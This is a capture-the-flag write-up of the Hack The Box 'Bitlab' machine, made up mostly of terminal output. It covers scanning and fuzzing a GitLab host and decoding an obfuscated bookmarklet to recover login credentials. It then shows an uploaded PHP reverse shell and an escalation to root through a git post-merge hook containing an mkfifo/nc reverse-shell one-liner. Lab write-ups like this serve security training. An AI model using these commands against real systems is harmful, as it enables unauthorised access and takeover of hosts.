---
title: "[HTB] Bitlab Writeup"
layout: post
---

---
```zsh
➜  ~  nmap -sS -sV -sC -p- -A -O 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-15 21:56 +03
Nmap scan report for 10.10.10.114
Host is up (0.062s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   63.62 ms 10.10.14.1
2   63.67 ms 10.10.10.114

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.23 seconds
```
```zsh
➜  ~  curl -s 10.10.10.114/robots.txt 
# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
#
# To ban all spiders from the entire site uncomment the next two lines:
# User-Agent: *
# Disallow: /

# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
# Only some crawlers respect this setting, e.g. Googlebot does not
# Crawl-delay: 1

# Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application
User-Agent: *
Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/
Disallow: /*/-/group_members
Disallow: /*/project_members
```
---
```zsh
➜  ~  curl -s 10.10.10.114/robots.txt  | awk '{print $2}' | cut -d '/' -f2 | grep -v "*" | wfuzz --hc=404 -c -z stdin http://10.10.10.114/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.114/FUZZ
Total requests: <<unknown>>

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                       
===================================================================

000000002:   302        0 L      5 W      99 Ch       ""                                                                                                            
000000001:   302        0 L      5 W      99 Ch       "See"                                                                                                         
000000010:   302        0 L      5 W      99 Ch       ""                                                                                                            
000000005:   302        0 L      5 W      99 Ch       "Disallow:"                                                                                                   
000000003:   302        0 L      5 W      99 Ch       "To"                                                                                                          
000000004:   302        0 L      5 W      99 Ch       "User-Agent:"                                                                                                 
000000006:   302        0 L      5 W      99 Ch       ""                                                                                                            
000000016:   301        7 L      20 W     236 Ch      "profile"                                                                                                     
000000008:   302        0 L      5 W      99 Ch       "Only"                                                                                                        
000000009:   302        0 L      5 W      99 Ch       "Crawl-delay:"                                                                                                
000000007:   302        0 L      5 W      99 Ch       "Add"                                                                                                         
000000012:   302        0 L      5 W      99 Ch       "autocomplete"                                                                                                
000000011:   302        0 L      5 W      99 Ch       "Based"                                                                                                       
000000014:   302        0 L      5 W      99 Ch       "api"                                                                                                         
000000022:   301        7 L      20 W     233 Ch      "help"                                                                                                        
000000015:   302        0 L      5 W      99 Ch       "admin"                                                                                                       
000000017:   302        0 L      5 W      99 Ch       "dashboard"                                                                                                   
000000018:   302        0 L      5 W      93 Ch       "projects"                                                                                                    
000000019:   302        0 L      5 W      100 Ch      "groups"                                                                                                      
000000021:   302        0 L      5 W      99 Ch       "users"                                                                                                       
000000020:   302        0 L      5 W      100 Ch      "groups"                                                                                                      
000000023:   302        0 L      5 W      99 Ch       "Only"                                                                                                        
000000024:   302        0 L      5 W      99 Ch       "users"                                                                                                       
000000025:   302        0 L      5 W      99 Ch       ""                                                                                                            
000000026:   302        0 L      5 W      99 Ch       "Global"                                                                                                      
000000027:   302        0 L      5 W      99 Ch       "s"                                                                                                           
000000028:   302        0 L      5 W      102 Ch      "snippets"                                                                                                    
000000029:   302        0 L      5 W      102 Ch      "snippets"                                                                                                    
000000030:   302        0 L      5 W      102 Ch      "snippets"                                                                                                    
000000031:   302        0 L      5 W      99 Ch       ""                                                                                                            
000000032:   302        0 L      5 W      99 Ch       "Project"                                                                                                     
000000013:   200        217 L    765 W    13074 Ch    "search"                                                                                                      

Total time: 1.775532
Processed Requests: 32
Filtered Requests: 0
Requests/sec.: 18.02276

```
```zsh
➜  ~  curl -s http://10.10.10.114/help/
```
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /help</title>
 </head>
 <body>
<h1>Index of /help</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="bookmarks.html">bookmarks.html</a></td><td align="right">2019-07-30 12:46  </td><td align="right">4.4K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
```
```zsh
➜  ~  curl -s http://10.10.10.114/help/bookmarks.html
```
```html
<!DOCTYPE NETSCAPE-Bookmark-file-1>
<!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! -->
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1>Bookmarks</H1>
<DL><p>
    <DT><H3 ADD_DATE="1564422476" LAST_MODIFIED="0" PERSONAL_TOOLBAR_FOLDER="true">Bookmarks bar</H3>
    <DL><p>
        <DT><A HREF="https://www.hackthebox.eu/" ADD_DATE="1554931938" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACuklEQVQ4jW2Tz2tcdRTFP+d+33szmUlGjCh0pppQrQYLlcaiRloxi2zERUUR7FYXutCVC/8AFy7MRkHc+B+04EqQLiIqKCqiBSUKRqLplCyMZl7n13vzvtfFi6Vg7/bcc7jcc46oR4ADdO87cS6YXna0jtM7Qq8J36qif9T/Y+fLWzni5nRbx5fa78h4VZBCRKpF3REYDqVHPtzbHb4F/dF/Ktbtdpsha31swTbwKsZKcTrGZqUEkKTujTmiBTcULFbxSjHOn9vf3x8HwO9YvGczJOGlWVFNh7lCkrk9sDrT+sUxp84VxEo62DcbDkQIsUjS8KAsXRgc/v2Jer3lJyxLv4gzp9WJtroxVe+hGdOh+P1qKoDl06XPzTt72wnfX2n4aGDREhGL8nzo3HXn20nQ6vBQ8ckLE3v2tRHTkfju06auftbw6zsJFtDK4yWPPTPl8ED65dvM51qeRHmaCFt33EHWbMOlzTa7PyV66sWJn39hIoC/rptf2mxr+dTMO3dHBOa4C1tPhI65O4AEhAA7P6T+6zepnn9zCMDld9tKMvzE6RLVf5U7CB1L3GsiR0GwAK2OEyNURY3MLzpmNVYbe7TvyJD3JXDHZc44F6OBhOMWbpJ8NJDGuUBe7wqQ982JW6qPiOVEnNmYcvJs6ZOhNL4hH9+QT4bSybOln9koKKcARCE5cUu93tKaZdnnsXIac9EeebrQylrBZCgWFuuk5gfyZtvZ/jrjx63Mp2OLFmobBXB86f73Qgivz2bVdJwrTTJ078qMh9cKAH7+KuPP7YSqxJvzXiZJaFRV9f7e7m9v/C/K7lV0VyxGbmVpAkjT6FlLUXLTUZSrYnSh3+9PAuB5npeDf5qXFzppB+lRoTRJUTbnZE0nSWVC5mgWKz7Y2x29kuf90a1tvE2dWcd1VGe/Jrhtnf8FOj1caqcXEh4AAAAASUVORK5CYII=">Hack The Box :: Penetration Testing Labs</A>
        <DT><A HREF="https://www.docker.com/" ADD_DATE="1554931981" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACE0lEQVQ4jbWTu2tUURDGf3P23JvdKxvRGIwEA1okmNSWAcFCBIs0+QfEF0hsFFtPwNIHKFosWGhhYbCzEERMQCIoiBYJCpEYAxJNk6e5u3vOGYtdkvVBsPGDYZhhHh/fnAPbwTmDU7Ntzf/Fva/XqMzfBmQz9xsj2/SCKoyOClP9wsC0MtUvxHgAKIETuAKI4iS2DpDWgMr8LXxtEGNnIOxDzCJSSDiz/wQAR15YhjqPsjTwDCcRp8bi1NDxsYtAmVp1FfQLhG8QFJF1qCdcf9dLVlonD3sp736K/XQWqOAkNhjcmbmKMILyHGO6sckc3ndTsMugBqULa2dZWRtlR+kN+foiWft7fHW8wN2Z40AvsIzIEkoOugaaI6wSwwYavhPjEhI68dVBitkuNPbg/RML5j7W7EHjDzQmiEQ0GiASQ1MjUTQakmJKqEP0F1nJH3J5YMFC/EyIHfhahgioyqa82qqw1kmzgJjXnDt4o3FSZywhvKSteJh6rYaQILLVJpvbA6ZgEfGE/BIgDKvBSTBAhRBWSNtSotYBj2qLRUizhDTboFo9xflDk6AwJgHAMNL3Ae9PkhQXyMoppfaErD0h29nwSRoQM0EtH+JC3wOcM7DF0qIqiDzm5vQkxdIxfN6HUqYgG2DnSJNXnO55i5tta9b+8hKb+qj8mfw3tDSq8IjmRxkDhmF6XGAi4txftjbwE2NZ43Pq//CoAAAAAElFTkSuQmCC">Enterprise Application Container Platform | Docker</A>
        <DT><A HREF="https://www.php.net/" ADD_DATE="1554931999" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAb0lEQVQ4jWNsaDjAQApgIkk1ORpY0Pjh4eIQxsqVL4m1QVNTk4ANWE0NDxeHcNFlr1+/Dld0/fp1glwmZA7cMXi4dAtWiHXILkYGyLIscFcywMLh+vXrcAamLMJJ8DDFZCCzmfC4BNl4OGCkeWoFAHM4Vw1BMLruAAAAAElFTkSuQmCC">PHP: Hypertext Preprocessor</A>
        <DT><A HREF="https://nodejs.org/en/" ADD_DATE="1554932008" ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jW2TT4iVVRjGn+c957vfnWlmuNZgKCkEhS7cmSS2aTe00M0wQn9IsRSCIMyFMbgqdKVtok2Bi1EQvAspMHATbVwWLQpiQKjUHJs7c6/3u/f77vfvPC6u84forA6H933Oy/vjB2w7CzcX3Mb9/A/vv3Xh9plfz9489cvpq+/M/V8NAHD8CNc+jhoAPr4zv3+SzUVfR++ZYpZ5QL+fBzNcQ8Clr08sLW8EtY+3a24kvXv99ZnZl3afi0L86WQ8OVX1glR5hYoYpgVdw5G1EiOv9P7ufHn1/PfJ5gSnb8/NT+2ILkZuYl8YGFzdKK00jxChLoCiCMiyvPLeR1PTTSDojxpavDz/7S1789zR2ezfaMk89+XDsgxBAuApEgGEQICE0RdlqUE/K513+//pdJbwwczztucVb3XSHKaPGczDAQQkwiAYRKMAiQLrOkCC6z4ZhIdrnfTgnlfNWvFIzThivtY0lQAgApSe/S6BBEmjyrpmFYIe9boWAtiabcl6+SyjmLQ6QtH3NAcoiOQ2TAAUSEDoDRKm+QjeO/Y6PRqeG8AZETUMf/71BEUeYEZIgKQt3hSMRFYV8GaILQKmpmGjaiQfU0kxxOp6X49XUjhPSALJbSGERIBQpRrNhlerSGXNVpMZ07Cy3g2NhuejlUSDtJD3JkHjJRICJFCiyKwqQgjSzhdepE3s7YYHq+szRajNOauKssKDhz2ajTEqiAgaoxxvo3beLCmy6coVwb557ae1pFueNPKei13U8I4rnaTqDTK5yCRKGk9QEaSfiCIG3Cvq6mT7wztdBwD3f7z/+643dl8nANIOoWGNPCuxq7VDdQXUQXSxd6Msz7O8uDJYzU7c/fzuz1uUFuDQHst05OKRA867xVCFtw+8vBc7p1sYpgVGo/JGkiaXrn1067f/9myZuYBNVQ9/cfjY0a/mlj/77szyJzdOHdvUeVyzKeFT9k18v9LwrSUAAAAASUVORK5CYII=">Node.js</A>
        <DT><A HREF="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142">Gitlab Login</A>
    </DL><p>
</DL><p>

```
```javascript

javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```
```zsh
---------------------------------------------------------------------------
# Decode; 
---------------------------------------------------------------------------
```
```javascript
javascript:(function(){ var _0x4b18=["value","user_login","getElementById","clave","user_password","11des0081x"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```
```zsh
---------------------------------------------------------------------------------------------------------------------------------------------------------
# Git sayfasında New file ile reverse shell.php dosyası oluşturulmuştur. Ayrıca 10.10.10.114/profile/shell.php şeklinde shell çağırılabilir.
---------------------------------------------------------------------------------------------------------------------------------------------------------
```
```zsh
➜  ~  curl -s 10.10.10.114/profile/shell.php 
```
```zsh
➜  ~  nc -lvp 1234
listening on [any] 1234 ...
10.10.10.114: inverse host lookup failed: Unknown host
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.114] 56274
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:18:17 up 22 min,  0 users,  load average: 0.82, 0.36, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
```zsh
$ sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
$ 
```
```zsh
$  cp -R /var/www/html/.git /tmp/
$  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4321 >/tmp/f" > .git/hooks/post-merge
$  chmod 777 .git/hooks/post-merge
```
```zsh
----------------------------------------------------------------------------------------------------------------
# Bu aşamada panelden yeni bir repo oluşturularak merge edilir. 
----------------------------------------------------------------------------------------------------------------
```
```zsh
$ sudo /usr/bin/git pull
From ssh://localhost:3022/root/profile
   cbbb89c..0cef591  master     -> origin/master
 * [new branch]      patch-4    -> origin/patch-4
Updating cbbb89c..0cef591
Fast-forward
 sdzvzcx | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 sdzvzcx
rm: cannot remove '/tmp/f': No such file or directory
```
-------------------------------------------------------------------------------------------------------------
```zsh
➜  ~  nc -lvp 4321
listening on [any] 4321 ...
10.10.10.114: inverse host lookup failed: Unknown host
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.114] 55332
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# wc -c /root/root.txt
33 /root/root.txt
# 
```


# Author <a href=" https://twitter.com/x67sv">x67sv</a> 
---
